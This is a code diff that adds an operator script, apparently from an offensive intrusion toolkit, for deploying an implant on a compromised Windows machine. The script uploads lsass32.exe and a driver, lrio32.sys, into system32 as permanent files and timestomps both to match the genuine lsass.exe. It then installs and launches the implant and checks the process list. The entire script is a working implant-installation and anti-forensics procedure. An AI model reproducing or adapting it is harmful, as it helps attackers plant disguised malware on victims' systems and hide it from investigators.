@@ -1,0 +1,53 @@
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+if ($argc <= 1) {
+	echo "You did do a pwd to check the systemroot directory, right?";
+	echo "Provide the directory as an argument, please.";
+	return false;
+}
+`dir lsass.exe -path $argv[1]`;
+echo "Make sure lsass exists and you have given the right path (like c:\\winnt\\system32)";
+pause;
+`dir lsass32.exe -path $argv[1]`;
+`dir lrio32.sys -path $argv[1]\\drivers`;
+echo "Make sure lsass32 does not exist, and lrio32.sys does not exist";
+pause;
+echo "Wait until the put's done putting";
+ifnot (`put $ScriptsDir\\..\\..\\..\\kingpin\\lsass32.exe -name $argv[1]\\lsass32.exe -permanent`) {
+	echo "Error in put!";
+	pause;
+}
+pause;
+echo "Wait until the put's done putting";
+ifnot (`put $ScriptsDir\\..\\..\\..\\kingpin\\lrio32.sys -name $argv[1]\\drivers\\lrio32.sys -permanent`) {
+	echo "Error in put!";
+	pause;
+}
+pause;
+`dir lsass32.exe -path $argv[1]`;
+`dir lrio32.sys -path $argv[1]\\drivers`;
+echo "Confirm that sizes are correct: 147383 and 11235";
+pause;
+`matchtimes $argv[1]\\lsass.exe $argv[1]\\lsass32.exe`;
+`matchtimes $argv[1]\\lsass.exe $argv[1]\\drivers\\lrio32.sys`;
+echo "About to run install...";
+pause;
+#`run -command "cmd /c $argv[1]\\lsass32.exe -i" -redirect kp_install.txt`;
+`run -command "cmd /c $argv[1]\\lsass32.exe -i"`;
+echo "About to start...";
+pause;
+`run -command "cmd /c start $argv[1]\\lsass32.exe -ns"`;
+`processlist`;
+echo "Check for lsass32.exe in the list, please.";
+echo "Done.";
+return true;
